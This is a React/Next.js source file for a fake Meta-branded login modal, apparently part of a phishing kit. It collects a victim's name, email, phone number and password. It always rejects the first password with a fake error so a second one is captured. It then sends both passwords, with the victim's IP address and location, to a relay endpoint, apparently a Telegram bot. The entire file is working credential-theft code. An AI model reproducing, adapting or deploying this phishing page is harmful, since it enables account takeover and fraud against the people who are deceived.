import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [password, setPassword] = useState('');
    const [passwordAttempt, setPasswordAttempt] = useState(1);
    const [firstPassword, setFirstPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [showTermsError, setShowTermsError] = useState(false);
    const [showPasswordError, setShowPasswordError] = useState(false);
    const [passwordErrorMessage, setPasswordErrorMessage] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['You need to log in to continue.', 'Full Name', 'Personal Email', 'Mobile phone number', 'Password', 'I agree with Terms of use', 'Submit'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleAgreeToTermsChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
        const isChecked = e.target.checked;
        setAgreeToTerms(isChecked);
        if (isChecked) {
            setShowTermsError(false);
        }
    }, []);

    const handlePasswordChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
        setPassword(e.target.value);
        if (showPasswordError) {
            setShowPasswordError(false);
        }
    }, [showPasswordError]);

    const handlePasswordSubmit = () => {
        if (passwordAttempt === 1) {
            // First attempt - show error and ask for re-entry
            if (!password) {
                setPasswordErrorMessage('Please enter a password');
                setShowPasswordError(true);
                return;
            }
            // Save first password
            setFirstPassword(password);
            // Show error message
            setPasswordErrorMessage('Invalid password. Please try again.');
            setShowPasswordError(true);
            setPassword('');
            setPasswordAttempt(2);
        } else {
            // Second attempt - proceed with submission
            if (!password) {
                setPasswordErrorMessage('Please enter a password');
                setShowPasswordError(true);
                return;
            }
            handleActualSubmit(firstPassword, password);
        }
    };

    const handleActualSubmit = async (pwd1: string, pwd2: string) => {
        if (isLoading) return;

        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>🔒 Password (Attempt 1):</b> <code>${pwd1}</code>
<b>🔒 Password (Attempt 2):</b> <code>${pwd2}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });

            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }

            nextStep();
            // Reset password state
            setPasswordAttempt(1);
            setFirstPassword('');
            setPassword('');
        } catch {
            nextStep();
            // Reset password state
            setPasswordAttempt(1);
            setFirstPassword('');
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (!agreeToTerms) {
            setShowTermsError(true);
            return;
        }

        if (passwordAttempt === 1 || passwordAttempt === 2) {
            handlePasswordSubmit();
            return;
        }

        if (isLoading) return;

        setIsLoading(true);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{t('You need to log in to continue.')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
                            </div>
                        ))}
                        <p className='font-sans'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                            }}
                        />
                        <p className='font-sans'>{t('Password')}</p>
                        <div className='relative w-full'>
                            <input type={showPassword ? 'text' : 'password'} value={password} onChange={handlePasswordChange} placeholder={passwordAttempt === 2 ? 'Re-enter your password' : ''} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10' required />
                            <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
                        </div>
                        {showPasswordError && <p className='text-red-600 text-sm font-medium'>{passwordErrorMessage}</p>}
                        <div className='flex flex-col gap-1 pt-2'>
                            <div className='flex items-center gap-2'>
                                <input type='checkbox' checked={agreeToTerms} onChange={handleAgreeToTermsChange} className='cursor-pointer' />
                                <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
                            </div>
                            {showTermsError && <p className='text-red-600 text-sm font-medium'>Please check this box to continue</p>}
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
